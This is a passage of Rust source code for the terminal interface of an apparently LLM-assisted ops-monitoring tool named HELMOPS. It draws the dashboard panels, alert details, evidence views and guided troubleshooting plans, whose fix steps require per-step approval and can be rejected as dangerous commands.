            render_input(app, vertical[1], buf);
            render_ops_footer(app, vertical[2], buf);
            if app.slash_popup.is_some() && app.modal.is_none() {
                render_slash_popup(app, vertical[1], buf);
            }
        } else {
            render_ops_footer(app, vertical[1], buf);
        }
        if let Some(toast) = &app.toast {
            render_toast(toast, area, buf);
        }
        if let Some(modal) = &app.modal {
            render_dim_overlay(area, buf);
            render_modal(app, modal, centered_rect(72, 52, area), buf);
        }
        return;
    }

    let (main_area, sidebar_area) = if app.show_sidebar && area.width > 60 {
        let chunks = Layout::default()
            .direction(Direction::Horizontal)
            .constraints([Constraint::Min(40), Constraint::Length(30)])
            .split(area);
        (chunks[0], Some(chunks[1]))
    } else {
        (area, None)
    };

    let vertical = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(2),
            Constraint::Min(6),
            Constraint::Length(input_height(&app.input.text, main_area.width)),
            Constraint::Length(1),
        ])
        .split(main_area);

    render_status(app, vertical[0], buf);
    render_chat(app, vertical[1], buf);
    render_input(app, vertical[2], buf);
    render_footer(app, vertical[3], buf);

    if let Some(sidebar_rect) = sidebar_area {
        render_sidebar(app, sidebar_rect, buf);
    }

    if app.slash_popup.is_some() && app.modal.is_none() {
        render_slash_popup(app, vertical[2], buf);
    }

    if let Some(toast) = &app.toast {
        render_toast(toast, area, buf);
    }

    if let Some(modal) = &app.modal {
        render_dim_overlay(area, buf);
        render_modal(app, modal, centered_rect(72, 52, area), buf);
    }
}

fn render_sidebar(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let block = Block::default()
        .borders(Borders::LEFT)
        .border_style(Style::default().fg(HEADER_BORDER))
        .title(Span::styled(
            " Tool History ",
            Style::default().fg(DIM_FG).add_modifier(Modifier::BOLD),
        ));

    let inner = block.inner(area);
    block.render(area, buf);

    let items: Vec<ListItem> = app
        .session
        .tool_timeline
        .iter()
        .rev()
        .map(|item| {
            let color = match item.status.as_str() {
                "queued" => DIM_FG,
                "starting" => TOOL_FG,
                "done" | "ok" => SUCCESS_FG,
                "failed" | "denied" => ERROR_FG,
                _ => DIM_FG,
            };
            let header = Line::from(vec![
                Span::styled(
                    format!("[{}] ", item.status),
                    Style::default().fg(color).add_modifier(Modifier::BOLD),
                ),
                Span::styled(&item.tool, Style::default().fg(APP_FG)),
            ]);
            let detail = Line::styled(format!("  {}", item.detail), Style::default().fg(DIM_FG));
            ListItem::new(vec![header, detail])
        })
        .collect();

    let list = ratatui::widgets::List::new(items);
    list.render(inner, buf);
}

/// Render the monitoring dashboard with compact system panels.
fn render_dashboard(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    if area.width < 40 || area.height < 10 {
        Paragraph::new("Dashboard needs a larger terminal")
            .style(Style::default().fg(DIM_FG))
            .render(area, buf);
        return;
    }

    if let Some(error) = &app.dashboard.error {
        Paragraph::new(error.as_str())
            .style(Style::default().fg(ERROR_FG))
            .block(
                Block::default()
                    .borders(Borders::ALL)
                    .title(" Dashboard ")
                    .border_style(Style::default().fg(HEADER_BORDER)),
            )
            .render(area, buf);
        return;
    }

    if area.width < 60 || area.height < 12 {
        Paragraph::new("HELMOPS needs a larger terminal")
            .style(Style::default().fg(OPS_MUTED))
            .render(area, buf);
        return;
    }

    let shell = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(OPS_BORDER))
        .style(Style::default().bg(OPS_BG));
    let inner = shell.inner(area);
    shell.render(area, buf);

    let vert = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(2),
            Constraint::Length(1),
            Constraint::Length(1),
            Constraint::Min(8),
        ])
        .split(inner);

    render_ops_header(app, vert[0], buf);
    render_ops_status_strip(app, vert[1], buf);
    render_ops_tabbar(app, vert[2], buf);
    render_ops_body(app, vert[3], buf);
}

fn render_ops_header(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let d = &app.dashboard.data;
    let hostname = if d.hostname.is_empty() {
        "localhost"
    } else {
        &d.hostname
    };
    let time_str = if d.collected_at.is_empty() {
        "--:-- UTC"
    } else {
        &d.collected_at
    };
    let provider_model = format!("{}/{}", app.provider_name.to_ascii_lowercase(), app.model);
    let cpu_color = if d.cpu_percent >= 85.0 {
        OPS_RED
    } else if d.cpu_percent >= 50.0 {
        OPS_YELLOW
    } else {
        OPS_GREEN
    };
    let mem_color = if d.memory_used_pct >= 85.0 {
        OPS_RED
    } else if d.memory_used_pct >= 70.0 {
        OPS_YELLOW
    } else {
        OPS_GREEN
    };
    let load_color = if d.load_1m >= 2.0 {
        OPS_YELLOW
    } else {
        OPS_MUTED
    };

    let rows = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(1), Constraint::Length(1)])
        .split(area);

    let top_right = format!(
        "load {:.1} {:.1} {:.1}  mem {:.0}% ",
        d.load_1m, d.load_5m, d.load_15m, d.memory_used_pct
    );
    let top_right_w = top_right.chars().count() as u16;
    let top = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Min(0), Constraint::Length(top_right_w)])
        .split(rows[0]);

    Paragraph::new(Line::from(vec![
        Span::styled(
            " HELMOPS",
            Style::default().fg(OPS_BLUE).add_modifier(Modifier::BOLD),
        ),
        Span::styled(" | ", Style::default().fg(OPS_DIM)),
        Span::styled(hostname.to_ascii_uppercase(), Style::default().fg(OPS_FG)),
        Span::styled(" | ", Style::default().fg(OPS_DIM)),
        Span::styled(provider_model, Style::default().fg(OPS_MUTED)),
        Span::styled(" | ", Style::default().fg(OPS_DIM)),
        Span::styled("●", Style::default().fg(OPS_GREEN)),
        Span::styled(
            " LIVE",
            Style::default().fg(OPS_GREEN).add_modifier(Modifier::BOLD),
        ),
        Span::styled(" | ", Style::default().fg(OPS_DIM)),
        Span::styled(time_str, Style::default().fg(OPS_MUTED)),
    ]))
    .style(Style::default().bg(OPS_SURFACE))
    .render(top[0], buf);

    Paragraph::new(Line::from(vec![
        Span::styled("load ", Style::default().fg(OPS_DIM)),
        Span::styled(format!("{:.1}", d.load_1m), Style::default().fg(load_color)),
        Span::styled(
            format!(" {:.1} {:.1}", d.load_5m, d.load_15m),
            Style::default().fg(OPS_MUTED),
        ),
        Span::styled("  mem ", Style::default().fg(OPS_DIM)),
        Span::styled(
            format!("{:.0}%", d.memory_used_pct),
            Style::default().fg(mem_color),
        ),
        Span::raw(" "),
    ]))
    .style(Style::default().bg(OPS_SURFACE))
    .render(top[1], buf);

    Paragraph::new(Line::from(vec![
        Span::styled(" cpu ", Style::default().fg(OPS_DIM)),
        Span::styled(
            format!("{:.0}%", d.cpu_percent),
            Style::default().fg(cpu_color),
        ),
    ]))
    .style(Style::default().bg(OPS_SURFACE))
    .render(rows[1], buf);
}

fn render_ops_status_strip(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let d = &app.dashboard.data;
    let m = &d.metrics;
    let badge = |label: &str, value: usize, fg: Color, bg: Color| {
        Span::styled(
            format!(" {label} {value} "),
            Style::default().fg(fg).bg(bg).add_modifier(Modifier::BOLD),
        )
    };
    let meter = |mount: &str, pct: u8| {
        let filled = ((pct as usize * 10) / 100).min(10);
        let empty = 10usize.saturating_sub(filled);
        let color = if pct >= 90 {
            OPS_RED
        } else if pct >= 75 {
            OPS_YELLOW
        } else {
            OPS_GREEN
        };
        let bar_bg = Color::Rgb(0x21, 0x26, 0x2d);
        let filled_bg = if color == OPS_RED {
            Color::Rgb(0xf8, 0x51, 0x49)
        } else if color == OPS_YELLOW {
            Color::Rgb(0xd2, 0x99, 0x22)
        } else {
            Color::Rgb(0x3f, 0xb9, 0x50)
        };
        vec![
            Span::styled(format!("{mount}: "), Style::default().fg(OPS_MUTED)),
            Span::styled(
                format!("{pct}%"),
                Style::default().fg(color).add_modifier(Modifier::BOLD),
            ),
            Span::styled(" ", Style::default()),
            Span::styled(" ".repeat(filled), Style::default().bg(filled_bg)),
            Span::styled(" ".repeat(empty), Style::default().bg(bar_bg)),
        ]
    };

    let left = Line::from(vec![
        badge("CRIT", m.critical, OPS_RED, Color::Rgb(0x3d, 0x1a, 0x1a)),
        Span::raw(" "),
        badge("WARN", m.warning, OPS_YELLOW, Color::Rgb(0x2d, 0x20, 0x08)),
        Span::raw(" "),
        badge(
            "INFO",
            d.finding_count.saturating_sub(m.critical + m.warning),
            OPS_BLUE,
            Color::Rgb(0x0d, 0x21, 0x37),
        ),
    ]);
    let mut right_spans = Vec::new();
    for (idx, (mount, pct)) in d.disk_bars.iter().take(2).enumerate() {
        if idx > 0 {
            right_spans.push(Span::styled("  ", Style::default()));
        }
        right_spans.extend(meter(mount, *pct));
    }
    let right = Line::from(right_spans);
    let right_w = right.width() as u16;
    let chunks = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Min(0), Constraint::Length(right_w)])
        .split(area);

    Paragraph::new(left)
        .style(Style::default().bg(OPS_BG))
        .render(chunks[0], buf);
    Paragraph::new(right)
        .style(Style::default().bg(OPS_BG))
        .render(chunks[1], buf);
}

fn render_ops_tabbar(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let mut spans = Vec::new();
    for tab in OpsTab::all() {
        let active = *tab == app.dashboard.active_tab;
        let fg = if active { OPS_FG } else { OPS_DIM };
        let bg = if active { OPS_BG } else { OPS_SURFACE };
        spans.push(Span::styled(
            format!(" {} ", tab.label()),
            Style::default().fg(fg).bg(bg).add_modifier(if active {
                Modifier::BOLD
            } else {
                Modifier::empty()
            }),
        ));
        spans.push(Span::styled(" ", Style::default().bg(OPS_SURFACE)));
    }
    Paragraph::new(Line::from(spans))
        .style(Style::default().bg(OPS_SURFACE))
        .render(area, buf);

    if let Some(idx) = OpsTab::all()
        .iter()
        .position(|tab| *tab == app.dashboard.active_tab)
    {
        let mut x = area.x;
        for (pos, tab) in OpsTab::all().iter().enumerate() {
            let width = tab.label().chars().count() as u16 + 2;
            if pos == idx {
                for dx in 0..width {
                    buf[(x + dx, area.y + area.height.saturating_sub(1))]
                        .set_style(Style::default().bg(OPS_BG).fg(OPS_BLUE));
                    buf[(x + dx, area.y + area.height.saturating_sub(1))].set_char('▁');
                }
                break;
            }
            x = x.saturating_add(width + 1);
        }
    }
}

fn render_ops_body(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let horiz = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(34), Constraint::Percentage(66)])
        .split(area);
    render_ops_queue(app, horiz[0], buf);
    match (app.dashboard.active_tab, app.dashboard.view) {
        (OpsTab::Alerts, DashboardView::EvidenceView(_)) => render_ops_evidence(app, horiz[1], buf),
        (OpsTab::Alerts, DashboardView::TroubleshootPlan(_)) => {
            render_ops_troubleshoot_plan(app, horiz[1], buf)
        }
        (OpsTab::Alerts, _) => render_ops_alerts(app, horiz[1], buf),
        (OpsTab::Services, _) => render_ops_services(app, horiz[1], buf),
        (OpsTab::Processes, _) => render_ops_processes(app, horiz[1], buf),
        (OpsTab::Logs, _) => render_ops_logs(app, horiz[1], buf),
        (OpsTab::Network, _) => render_ops_network(app, horiz[1], buf),
        (OpsTab::Disk, _) => render_ops_storage(app, horiz[1], buf),
        (OpsTab::Changes, _) => render_ops_changes(app, horiz[1], buf),
        (OpsTab::Fleet, _) => render_fleet_tab(
            app,
            horiz[1],
            buf,
            &app.dashboard.data.fleet_hosts,
            app.dashboard.fleet_selected_row,
        ),
    }
}

fn render_ops_queue(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let shell = Block::default()
        .borders(Borders::RIGHT)
        .border_style(Style::default().fg(OPS_BORDER))
        .style(Style::default().bg(OPS_BG));
    let inner = shell.inner(area);
    shell.render(area, buf);

    let vert = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Length(1), Constraint::Min(3)])
        .split(inner);

    let visible = app.dashboard_visible_finding_indices();
    {
        let count_str = format!("{} open ", visible.len());
        let count_len = count_str.chars().count() as u16;
        let hdr = Layout::default()
            .direction(Direction::Horizontal)
            .constraints([Constraint::Min(0), Constraint::Length(count_len)])
            .split(vert[0]);
        Paragraph::new(Line::from(Span::styled(
            " FINDING QUEUE",
            Style::default().fg(OPS_MUTED),
        )))
        .style(Style::default().bg(OPS_SURFACE))
        .render(hdr[0], buf);
        Paragraph::new(Line::from(Span::styled(
            count_str,
            Style::default().fg(OPS_BLUE),
        )))
        .style(Style::default().bg(OPS_SURFACE))
        .render(hdr[1], buf);
    }

    if app.dashboard.active_tab != OpsTab::Alerts {
        Paragraph::new(vec![
            Line::from(""),
            Line::from(Span::styled(
                " View active in ALERTS tab",
                Style::default().fg(OPS_DIM),
            )),
        ])
        .style(Style::default().bg(OPS_BG))
        .render(vert[1], buf);
    } else if visible.is_empty() {
        Paragraph::new(Line::from(Span::styled(
            " No active findings",
            Style::default().fg(OPS_MUTED),
        )))
        .style(Style::default().bg(OPS_BG))
        .render(vert[1], buf);
    } else {
        let list_h = vert[1].height as usize;
        let rows_per = 5usize;
        let visible_cap = (list_h / rows_per).max(1);
        let sel_vpos = app.selected_visible_index().unwrap_or(0);
        let start = if sel_vpos >= app.dashboard.table_scroll + visible_cap {
            sel_vpos.saturating_sub(visible_cap.saturating_sub(1))
        } else {
            app.dashboard.table_scroll
        };

        let pane_w = vert[1].width as usize;
        let mut lines: Vec<Line> = Vec::new();

        for (i, actual_idx) in visible.iter().enumerate().skip(start).take(visible_cap) {
            let finding = &app.dashboard.data.findings[*actual_idx];
            let sev = finding.severity.as_str();
            let selected = i == sel_vpos;
            let bg = if selected { OPS_SURFACE } else { OPS_BG };
            let sev_color = match sev {
                "critical" => OPS_RED,
                "warning" => OPS_YELLOW,
                _ => OPS_BLUE,
            };
            let sev_label = match sev {
                "critical" => "CRIT",
                "warning" => "WARN",
                _ => "INFO",
            };
            let rejected = finding.state_note.contains("plan_rejected");
            let title_color = if selected {
                Color::Rgb(0xe6, 0xed, 0xf3)
            } else {
                OPS_FG
            };

            let prefix = if rejected {
                format!(" ● {} ⚠ ", sev_label)
            } else {
                format!(" ● {} ", sev_label)
            };
            let status = finding.status.label().to_ascii_lowercase();
            let gap = pane_w
                .saturating_sub(prefix.chars().count())
                .saturating_sub(status.chars().count());
            lines.push(Line::from(vec![
                Span::styled(
                    prefix,
                    Style::default()
                        .fg(sev_color)
                        .bg(bg)
                        .add_modifier(Modifier::BOLD),
                ),
                Span::styled(" ".repeat(gap), Style::default().bg(bg)),
                Span::styled(status, Style::default().fg(OPS_DIM).bg(bg)),
            ]));

            let title = truncate_cell(&finding.title, pane_w.saturating_sub(2));
            lines.push(Line::from(vec![
                Span::styled("  ", Style::default().bg(bg)),
                Span::styled(title, Style::default().fg(title_color).bg(bg)),
            ]));

            let kh = format!("{} · {}", finding.kind, finding.host);
            let kh = truncate_cell(&kh, pane_w.saturating_sub(2));
            lines.push(Line::from(vec![
                Span::styled("  ", Style::default().bg(bg)),
                Span::styled(kh, Style::default().fg(OPS_DIM).bg(bg)),
            ]));
            let timing = format!(
                "{}  ·  {}",
                format_open_duration_since(finding.first_seen),
                format_last_seen_since(finding.last_seen)
            );
            let timing = truncate_cell(&timing, pane_w.saturating_sub(2));
            lines.push(Line::from(vec![
                Span::styled("  ", Style::default().bg(bg)),
                Span::styled(timing, Style::default().fg(OPS_MUTED).bg(bg)),
            ]));
            lines.push(Line::from(Span::styled(
                "─".repeat(pane_w.max(1)),
                Style::default().fg(OPS_BORDER).bg(OPS_BG),
            )));
        }

        Paragraph::new(lines)
            .style(Style::default().bg(OPS_BG))
            .render(vert[1], buf);
    }
}

fn render_ops_alerts(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let actual_idx = app
        .dashboard_selected_finding_index()
        .or_else(|| app.dashboard_visible_finding_indices().first().copied());
    let Some(actual_idx) = actual_idx else {
        Paragraph::new(Line::from(Span::styled(
            " Select an alert from the queue",
            Style::default().fg(OPS_MUTED),
        )))
        .style(Style::default().bg(OPS_BG))
        .render(area, buf);
        return;
    };
    let finding = &app.dashboard.data.findings[actual_idx];

    let sev_color = match finding.severity.as_str() {
        "critical" => OPS_RED,
        "warning" => OPS_YELLOW,
        _ => OPS_BLUE,
    };
    let sev_label = match finding.severity.as_str() {
        "critical" => "CRIT",
        "warning" => "WARN",
        _ => "INFO",
    };

    let last_seen_str = format_dashboard_when(finding.last_seen);
    let first_seen_str = format_dashboard_when(finding.first_seen);

    let w = area.width as usize;
    let sep = Line::from(Span::styled("─".repeat(w), Style::default().fg(OPS_BORDER)));
    let blank = Line::from("");
    let cmd_style = Style::default()
        .fg(Color::Rgb(0x79, 0xc0, 0xff))
        .bg(OPS_SURFACE);

    let mut lines: Vec<Line> = Vec::new();

    // ── Header ───────────────────────────────────────────────────────
    lines.push(Line::from(vec![
        Span::styled(" ● ", Style::default().fg(sev_color)),
        Span::styled(
            format!("{sev_label} · {}", finding.kind),
            Style::default().fg(sev_color).add_modifier(Modifier::BOLD),
        ),
        Span::styled("  ", Style::default()),
        Span::styled(
            finding.title.as_str(),
            Style::default().fg(OPS_FG).add_modifier(Modifier::BOLD),
        ),
    ]));
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(Span::styled(
        "WHAT BROKE",
        Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
    )));
    lines.push(Line::from(Span::styled(
        finding.title.as_str(),
        Style::default().fg(OPS_FG),
    )));
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(Span::styled(
        "WHEN",
        Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
    )));
    lines.push(Line::from(vec![
        Span::styled("Open    ", Style::default().fg(OPS_MUTED)),
        Span::styled(
            format_open_duration_since(finding.first_seen),
            Style::default().fg(OPS_FG),
        ),
    ]));
    lines.push(Line::from(vec![
        Span::styled("Seen    ", Style::default().fg(OPS_MUTED)),
        Span::styled(last_seen_str, Style::default().fg(OPS_FG)),
    ]));
    lines.push(Line::from(vec![
        Span::styled("First   ", Style::default().fg(OPS_MUTED)),
        Span::styled(first_seen_str, Style::default().fg(OPS_FG)),
    ]));
    lines.push(Line::from(vec![
        Span::styled("Host    ", Style::default().fg(OPS_MUTED)),
        Span::styled(finding.host.as_str(), Style::default().fg(OPS_FG)),
    ]));
    lines.push(Line::from(vec![
        Span::styled("Status  ", Style::default().fg(OPS_MUTED)),
        Span::styled(
            finding.status.label().to_ascii_lowercase(),
            Style::default().fg(OPS_BLUE),
        ),
    ]));
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(Span::styled(
        "WHY IT HAPPENED",
        Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
    )));
    if !finding.assumptions.is_empty() {
        for a in &finding.assumptions {
            lines.push(Line::from(Span::styled(
                a.as_str(),
                Style::default().fg(OPS_FG),
            )));
        }
    } else if !finding.evidence_text.trim().is_empty() {
        if let Some(first) = finding.evidence_text.lines().next() {
            let first = first.trim();
            if !first.is_empty() {
                lines.push(Line::from(Span::styled(first, Style::default().fg(OPS_FG))));
            }
        }
    } else {
        lines.push(Line::from(Span::styled(
            "No root-cause summary captured yet.",
            Style::default().fg(OPS_MUTED),
        )));
    }
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(Span::styled(
        "IMPACT",
        Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
    )));
    if finding.impact.trim().is_empty() {
        lines.push(Line::from(Span::styled(
            "Impact not yet summarized.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        lines.push(Line::from(Span::styled(
            finding.impact.as_str(),
            Style::default().fg(OPS_FG),
        )));
    }
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(Span::styled(
        "WHAT CHANGED BEFORE IT BROKE",
        Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
    )));
    if let Some(plan) = app.dashboard.data.change_sets.iter().find(|change| {
        change.plan_id
            == app
                .dashboard
                .active_plan
                .as_ref()
                .map(|p| p.plan_id.as_str())
                .unwrap_or_default()
    }) {
        lines.push(Line::from(Span::styled(
            format!("Recent reviewed change-set: {} ({})", plan.id, plan.status),
            Style::default().fg(OPS_FG),
        )));
    } else {
        lines.push(Line::from(Span::styled(
            "No reviewed change-set is linked to this incident yet.",
            Style::default().fg(OPS_MUTED),
        )));
    }
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(Span::styled(
        "HOW TO REPRODUCE / VERIFY",
        Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
    )));
    if finding.read_only_checks.is_empty() {
        lines.push(Line::from(Span::styled(
            "No verification checks stored yet.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        for check in &finding.read_only_checks {
            lines.push(Line::from(vec![
                Span::styled("  - ", Style::default().fg(OPS_DIM)),
                Span::styled(check.as_str(), Style::default().fg(OPS_FG)),
            ]));
        }
    }
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(vec![
        Span::styled(
            "RECOMMENDED FIX PLAN ",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        ),
        Span::styled("(approval required per step)", Style::default().fg(OPS_DIM)),
    ]));
    let active_plan = app
        .dashboard
        .active_plan
        .as_ref()
        .filter(|p| p.finding_id == finding.id);
    if let Some(plan) = active_plan {
        match &plan.status {
            PlanStatus::Ready { fix_steps, .. } => {
                for (i, step) in fix_steps.iter().enumerate() {
                    let prefix = format!("{}. ", i + 1);
                    lines.push(Line::from(vec![
                        Span::styled(prefix, Style::default().fg(OPS_DIM)),
                        Span::styled(
                            format!(" {} ", step.command),
                            cmd_style.add_modifier(Modifier::BOLD),
                        ),
                    ]));
                }
            }
            _ => lines.push(Line::from(Span::styled(
                plan.summary_from_status(),
                Style::default().fg(OPS_MUTED),
            ))),
        }
    } else if let Some(fix) = &finding.fix_plan {
        for (i, step_line) in fix.lines().enumerate() {
            if !step_line.trim().is_empty() {
                lines.push(Line::from(vec![
                    Span::styled(format!("  {}. ", i + 1), Style::default().fg(OPS_DIM)),
                    Span::styled(format!(" {} ", step_line.trim()), cmd_style),
                ]));
            }
        }
    } else {
        lines.push(Line::from(Span::styled(
            "  Press Alt+G to generate the guided troubleshooting plan.",
            Style::default().fg(OPS_MUTED),
        )));
    }
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(vec![
        Span::styled(
            "EVIDENCE READ ",
            Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
        ),
        Span::styled(
            "(read-only, already collected)",
            Style::default().fg(OPS_DIM),
        ),
    ]));
    if finding.read_only_checks.is_empty() {
        lines.push(Line::from(Span::styled(
            "  No read-only checks stored yet.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        for check in &finding.read_only_checks {
            lines.push(Line::from(vec![
                Span::styled("  ✓ ", Style::default().fg(OPS_GREEN)),
                Span::styled(check.as_str(), Style::default().fg(OPS_DIM)),
            ]));
        }
    }
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(Span::styled(
        "ROLLBACK",
        Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
    )));
    if finding.rollback.trim().is_empty() {
        lines.push(Line::from(Span::styled(
            "  No rollback documented.",
            Style::default().fg(OPS_MUTED),
        )));
    } else {
        lines.push(Line::from(Span::styled(
            finding.rollback.as_str(),
            Style::default().fg(OPS_FG),
        )));
    }
    lines.push(blank.clone());

    lines.push(sep.clone());
    lines.push(Line::from(Span::styled(
        "EXECUTION STATUS",
        Style::default().fg(OPS_MUTED).add_modifier(Modifier::BOLD),
    )));
    if let Some(change) = app.dashboard.data.change_sets.iter().find(|change| {
        change.plan_id
            == active_plan
                .map(|plan| plan.plan_id.as_str())
                .unwrap_or_default()
    }) {
        lines.push(Line::from(Span::styled(
            format!("{} · created {}", change.status, change.created_at),
            Style::default().fg(OPS_FG),
        )));
    } else {
        lines.push(Line::from(Span::styled(
            "No reviewed execution has been recorded for this incident.",
            Style::default().fg(OPS_MUTED),
        )));
    }
    lines.push(blank.clone());

    lines.push(Line::from(vec![
        Span::styled(
            " Alt+G — Generate plan ↗ ",
            Style::default()
                .fg(OPS_BLUE)
                .bg(Color::Rgb(0x1a, 0x23, 0x32)),
        ),
        Span::styled(" ", Style::default().bg(OPS_BG)),
        Span::styled(
            " Alt+E — Evidence ↗ ",
            Style::default()
                .fg(OPS_BLUE)
                .bg(Color::Rgb(0x1a, 0x23, 0x32)),
        ),
        Span::styled(" ", Style::default().bg(OPS_BG)),
        Span::styled(
            " S — Suppress ",
            Style::default()
                .fg(OPS_YELLOW)
                .bg(Color::Rgb(0x1a, 0x20, 0x08)),
        ),
    ]));
    lines.push(blank.clone());
    lines.push(Line::from(vec![Span::styled(
        " R — Resolve ",
        Style::default()
            .fg(OPS_GREEN)
            .bg(Color::Rgb(0x0d, 0x20, 0x08)),
    )]));

    Paragraph::new(lines)
        .style(Style::default().bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .wrap(Wrap { trim: false })
        .render(area, buf);
}

fn render_ops_evidence(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let block = Block::default()
        .title(" EVIDENCE ")
        .borders(Borders::ALL)
        .border_style(Style::default().fg(OPS_BORDER));
    let inner = block.inner(area);
    block.render(area, buf);

    let actual_idx = app
        .dashboard_selected_finding_index()
        .or_else(|| app.dashboard_visible_finding_indices().first().copied());
    let Some(actual_idx) = actual_idx else {
        Paragraph::new("Select an alert from the queue")
            .style(Style::default().fg(OPS_MUTED))
            .render(inner, buf);
        return;
    };
    let finding = &app.dashboard.data.findings[actual_idx];
    let mut text = format!(
        "{} · {}\n\nSnapshot   {}\nHost       {}\nStatus     {}\nRisk       {}\nRollback   {}\n\nSOURCES\n{}\n\nEVIDENCE\n{}\n\nEXACT COMMANDS\n{}\n",
        finding.kind,
        finding.title,
        finding.snapshot_id,
        finding.host,
        finding.status.label(),
        finding.risk,
        finding.rollback,
        if finding.evidence_sources.is_empty() {
            "(none)".to_owned()
        } else {
            finding.evidence_sources.join("\n")
        },
        if finding.evidence_text.trim().is_empty() {
            "(no evidence captured yet)".to_owned()
        } else {
            finding.evidence_text.clone()
        },
        if finding.command_preview.trim().is_empty() {
            "(no exact commands recorded)".to_owned()
        } else {
            finding.command_preview.clone()
        }
    );
    if !finding.missing_data.is_empty() {
        text.push_str("\nMISSING DATA\n");
        text.push_str(&finding.missing_data.join("\n"));
        text.push('\n');
    }
    text.push_str("\nEnter return to detail   Alt+F follow-up   Alt+G generate plan");

    Paragraph::new(text)
        .style(Style::default().fg(OPS_FG).bg(OPS_BG))
        .scroll((app.dashboard.detail_scroll as u16, 0))
        .wrap(Wrap { trim: false })
        .render(inner, buf);
}

fn render_ops_troubleshoot_plan(app: &TuiApp, area: Rect, buf: &mut Buffer) {
    let block = Block::default()
        .title(" GUIDED TROUBLESHOOTING ")
        .borders(Borders::ALL)
        .border_style(Style::default().fg(OPS_BORDER));
    let inner = block.inner(area);
    block.render(area, buf);

    let actual_idx = app
        .dashboard_selected_finding_index()
        .or_else(|| app.dashboard_visible_finding_indices().first().copied());
    let Some(actual_idx) = actual_idx else {
        Paragraph::new("Select an alert from the queue")
            .style(Style::default().fg(OPS_MUTED))
            .render(inner, buf);
        return;
    };
    let finding = &app.dashboard.data.findings[actual_idx];
    let text = if let Some(plan) = &app.dashboard.active_plan {
        if plan.finding_id == finding.id {
            let header = format!(
                "{} · {}\nPlan ID   {}\n",
                finding.kind, finding.title, plan.plan_id
            );
            let body = match &plan.status {
                PlanStatus::Loading { .. } => {
                    let spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
                        [app.spinner % 10];
                    format!("{spinner} Generating narrative… (Alt+G to cancel)\n")
                }
                PlanStatus::Ready {
                    narrative,
                    fix_steps,
                } => {
                    let mut s = String::new();
                    s.push_str("── WHY IT HAPPENED ──\n");
                    s.push_str(narrative);
                    s.push_str("\n\n── FIX PLAN ──\n");
                    for (i, step) in fix_steps.iter().enumerate() {
                        s.push_str(&format!(
                            "\nStep {}:  COMMAND   {}\n          PURPOSE   {}\n          RISK      {}\n          ROLLBACK  {}\n",
                            i + 1,
                            step.command,
                            step.purpose,
                            step.risk,
                            step.rollback,
                        ));
                        if !step.binary_warnings.is_empty() {
                            for w in &step.binary_warnings {
                                s.push_str(&format!("          ⚠ WARNING  {w}\n"));
                            }
                        }
                    }
                    s.push_str("\n\nAlt+A open reviewed apply flow   Enter apply   Esc detail");
                    s
                }
                PlanStatus::Timeout => {
                    "⚠ LLM call timed out after 30s.\nPress Alt+G to retry.\n\nAlt+A open reviewed apply flow   Enter apply   Esc detail"
                        .to_string()
                }
                PlanStatus::RateLimited { retry_after_secs } => {
                    // Compute remaining seconds from the rate_limit_retry_at if set.
                    let remaining = plan
                        .rate_limit_retry_at
                        .map(|at| {
                            let now = Instant::now();
                            if now >= at {
                                0
                            } else {
                                (at - now).as_secs()
                            }
                        })
                        .unwrap_or(*retry_after_secs);
                    format!(
                        "⏱ Rate limited. Retrying in {remaining}s…\n\nAlt+A open reviewed apply flow   Enter apply   Esc detail"
                    )
                }
                PlanStatus::AuthFailed => {
                    "🔒 Provider authentication failed.\nRun `helmops init --provider X` to reconfigure.\n\nAlt+A open reviewed apply flow   Enter apply   Esc detail"
                        .to_string()
                }
                PlanStatus::MalformedResponse => {
                    "⚠ LLM returned unparseable response. Debug info logged.\nPress Alt+G to retry.\n\nAlt+A open reviewed apply flow   Enter apply   Esc detail"
                        .to_string()
                }
                PlanStatus::DangerousCommand { pattern, .. } => {
                    format!(
                        "🚫 Command rejected: {pattern}\nManual review required. The rejected command has been logged.\n\nAlt+A open reviewed apply flow   Enter apply   Esc detail"
                    )
                }
            };
            format!("{header}\n{body}")
        } else {
            format!(
